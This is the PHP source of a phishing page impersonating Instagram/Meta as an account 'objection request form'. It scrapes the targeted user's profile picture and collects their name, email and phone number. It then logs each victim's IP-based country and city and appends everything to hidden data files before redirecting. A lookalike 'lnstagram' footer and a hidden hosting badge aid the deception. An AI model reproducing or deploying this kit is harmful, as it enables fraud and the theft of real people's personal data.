<?php
require 'load.php';
session_start();
error_reporting(E_ALL);

$username=$_GET['nick'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
	$mail=$_POST['mail'];
	$tel=$_POST['tel'];
	$name=$_POST['name'];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
  $file = fopen('app/database/data/kd.php', 'a');
  fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#0000a0'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='darkblue'>

<font color='red'> FORM SAYFASI: </font>
<font color='red'> Username: </font><font color='white'>".$username."</font><br>
<font color='red'> Full Name: </font><font color='white'>".$name."</font><br>

<br></br>

"); 
 
fclose($file);



 $file = fopen('app/database/data/mail.php', 'a');
  fwrite($file, "
<html>
<head>
  <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='dark'>

<font color='red'>Login</font>
<font color='red'>Kullanıcı adı:</font><font color='white'>".$username."</font><br>
<font color='red'>E-Mail:</font><font color='white'>".$mail."</font><br>

<br></br>

"); 
 
fclose($file);



 $file = fopen('app/database/data/no.php', 'a');
  fwrite($file, "
<html>
<head>
  <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='dark'>

<font color='red'>Login</font>
<font color='red'>Kullanıcı adı:</font><font color='white'>".$username."</font><br>
<font color='red'>Telefon No:</font><font color='white'>".$tel."</font><br>

<br></br>

"); 
 
fclose($file);


echo '';
  
   header("Location: sc.php");
}

?>
<!DOCTYPE html>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
<html>
<head>
<link rel="stylesheet" href="css/xss1.css">
<link rel="stylesheet" type="text/css" href="css/xss2.css">
<link rel="stylesheet" href="css/xss3.css">
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<title>Rules Media Portal | Instagram</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1, user-scalable=no">
<link rel="icon" href="image/ig-logo.png">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>
<body>
<header>
<table>
<tr>
<td><img src="image/meta.svg" width="250" height="70"></td>

</tr>
</table>
</header>
<center>
<div class="home">
<br><br>
<div class="mx">
<div class="wrapper fadeInDown">
<div id="formContent">
<br>
<div class="fadeIn first">
<img src="<?php  echo  $pp; ?>" style="max-width:90%; border-radius:50%;" width="135">
<br><br>
<h3 class="title" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif;"><b>@<?php echo $username;?></b></h3>
<p class="text5" style="color: black!important;">Please fill out the objection request form completely and accurately.</p>
<form  method="post" >
<div  style="margin-bottom:20px;"></div>
<input style="width: 80%;" required name="name" placeholder="Name Surname" type="text">
<div  style="margin-bottom:20px;"></div>
<input style="width: 80%; " required name="mail" placeholder="E-Mail Address" type="email">
<div  style="margin-bottom:20px;"></div>
<input style="width: 80%;" minlength="6" required name="tel" placeholder="Phone Number" type="number">
<div  style="margin-bottom:20px;"></div>
<div  style="margin-bottom:15px;"></div>
<center>
<button type="submit" class="submit">
<div class="f4x" style="margin-left: 0px;">
<span class="comm">Submit</span>
</div>
</button>
</center>
</form>
</div>
</div>
<br><br>
</div>
</div>
</div>
<h5 class="title2" style="text-align:center;color: white;font-family: Helvetica, Arial, Sans-Serif;"><b>© 2022 lnstagram From Meta.</b></h5>
</center>
</body>
</html>